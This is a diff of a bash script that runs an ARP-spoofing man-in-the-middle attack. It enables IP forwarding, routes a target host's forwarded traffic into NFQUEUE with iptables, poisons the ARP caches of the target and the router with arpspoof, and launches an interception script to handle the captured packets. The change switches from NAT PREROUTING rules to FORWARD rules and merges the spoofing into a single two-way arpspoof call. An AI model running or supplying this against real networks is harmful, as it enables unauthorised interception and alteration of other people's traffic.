@@ -14,31 +14,23 @@ echo "" > log
 trap 'end' INT
 
 function end() {
-	kill $PID0
 	kill $PID1
 	kill $PID2
-#	iptables -t nat -D PREROUTING 1
-	iptables -t nat -D PREROUTING 1
+	iptables -D FORWARD 1
+	iptables -D FORWARD 1
 	echo "Shutting down..."
-	wait $PID0
 	wait $PID1
 }
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-#iptables -t nat -A PREROUTING -i $interface -s $target -j NFQUEUE --queue-num 0
-#iptables -t nat -A PREROUTING -i ens38 -d $target -j NFQUEUE --queue-num 0
-iptables -t nat -A PREROUTING -i $interface -j NFQUEUE --queue-num 0
-#iptables -t nat -A PREROUTING -i ens38 -j NFQUEUE --queue-num 0
+iptables -A FORWARD -i $interface -d $target -j NFQUEUE --queue-num 0
+iptables -A FORWARD -i $interface -s $target -j NFQUEUE --queue-num 0
 
-arpspoof -i $interface -t $target $router >> log 2>&1 &
-PID0=$!
-
-arpspoof -i ens33 -t $router $target >> log 2>&1 &
+arpspoof -i $interface -t $target -r $router >> log 2>&1 &
 PID1=$!
 
-#./intercept.py 2>&1 &
-./nfqueue_recorder -o test.pcap
+./intercept.py 2>&1 &
 PID2=$!
 
 cat
